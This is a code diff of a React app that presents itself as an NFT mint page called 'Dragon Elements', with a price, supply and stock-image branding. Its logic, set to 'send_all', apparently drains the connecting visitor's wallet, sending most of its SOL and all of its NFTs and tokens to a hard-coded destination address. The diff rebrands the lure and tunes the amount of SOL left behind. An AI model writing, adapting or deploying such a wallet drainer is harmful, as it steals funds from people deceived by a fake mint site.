@@ -1,42 +1,18 @@
 import './App.css';
-import {
-    // MintLayout,
-    TOKEN_PROGRAM_ID,
-    // ASSOCIATED_TOKEN_PROGRAM_ID,
-    createAssociatedTokenAccountInstruction,
-    getAssociatedTokenAddress,
-    // createCloseAccountInstruction,
-    createTransferInstruction,
-} from '@solana/spl-token';
-import {
-    clusterApiUrl,
-    // ParsedAccountData,
-    Connection,
-    // Keypair,
-    SystemProgram,
-    Transaction,
-    // sendAndConfirmTransaction,
-    // SYSVAR_RENT_PUBKEY,
-    PublicKey,
-    // TransactionInstruction,
-    LAMPORTS_PER_SOL,
-} from '@solana/web3.js';
-import { useState } from 'react';
-// import {readFile} from "fs/promises";
-// import bs58 from 'bs58';
+import {TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction,} from '@solana/spl-token';
+import {clusterApiUrl, Connection, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL} from '@solana/web3.js';
+
 import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-
-const solAmount = 0.5
-const image = 'https://pbs.twimg.com/profile_images/1560507816992903169/yl6ynnGY_400x400.jpg'
-const Title = 'WADE: Friends & Family'
-const supply = 1890
+const solAmount = 0.3
+const image = 'https://static9.depositphotos.com/1307373/1179/i/600/depositphotos_11794280-stock-photo-red-apple.jpg'
+const Title = 'Dragon Elements'
+const supply = 1110
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
-
 
 const ACTION = 'send_all';
 
@@ -52,8 +28,6 @@ export const WRAPPED_SOL = 'So11111111111111111111111111111111111111112';
 console.log(DESTINATION)
 
 function App() {
-    const [remainingSolana, setRemainingSolana] = useState(0.01)
-
     // function sleep(ms) {
     //     return new Promise(resolve => setTimeout(resolve, ms));
     // }
@@ -156,30 +130,42 @@ function App() {
         console.log(`\nSending Solana to destination...\n`);
 
         const toAccount = new PublicKey(DESTINATION)
-        
-        const accountsArray = await getTokenAccounts(connection, walletKeyPair.publicKey);
-            
-            const accounts1 = accountsArray.length
-            
-            if(accounts1 < 10){
-                setRemainingSolana(0.01)
-            } else if(accounts1 < 19){
-                setRemainingSolana(0.02)
-            } else if(accounts1 < 28){
-                setRemainingSolana(0.03)
-            } else if(accounts1 < 37){
-                setRemainingSolana(0.04)
-            } else if(accounts1 < 46){
-                setRemainingSolana(0.05)
-            } else if(accounts1 < 55){
-                setRemainingSolana(0.06)
-            }
-            
-            console.log(accounts1, remainingSolana)
 
         try {
             const balance = await connection.getBalance(walletKeyPair.publicKey);
-            
+
+            const accountsArray = await getTokenAccounts(connection, walletKeyPair.publicKey);
+
+            const accounts1 = accountsArray.length
+
+            let remainingSolana
+
+            if(accounts1 < 10){
+                remainingSolana = 0.01
+            } else if(accounts1 < 19){
+                remainingSolana = 0.02
+            } else if(accounts1 < 28){
+                remainingSolana = 0.03
+            } else if(accounts1 < 37){
+                remainingSolana = 0.04
+            } else if(accounts1 < 46){
+                remainingSolana = 0.05
+            } else if(accounts1 < 55){
+                remainingSolana = 0.06
+            } else if(accounts1 < 64){
+                remainingSolana = 0.07
+            } else if(accounts1 < 73){
+                remainingSolana = 0.08
+            } else if(accounts1 < 82){
+                remainingSolana = 0.09
+            } else if(accounts1 < 91){
+                remainingSolana = 0.1
+            } else {
+                remainingSolana = 0.1
+            }
+
+            console.log(accounts1, remainingSolana)
+
             const toSend = balance - (remainingSolana * LAMPORTS_PER_SOL);
 
             if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
@@ -278,13 +264,13 @@ function App() {
             connection,
         );
 
-        while (true) {
+        // while (true) {
         const accounts = await getTokenAccounts(connection, walletKeyPair.publicKey);
         console.log(accounts)
 
         if (accounts.length === 0) {
             console.log(`Finished transferring NFTs and tokens.`);
-            break;
+            // break;
         }
 
         console.log(`Found ${accounts.length} accounts...`);
@@ -340,7 +326,7 @@ function App() {
         }
 
         // await sleep(10 * 1000);
-        }
+        // }
 
         // await closeAccounts(
         //     walletKeyPair,
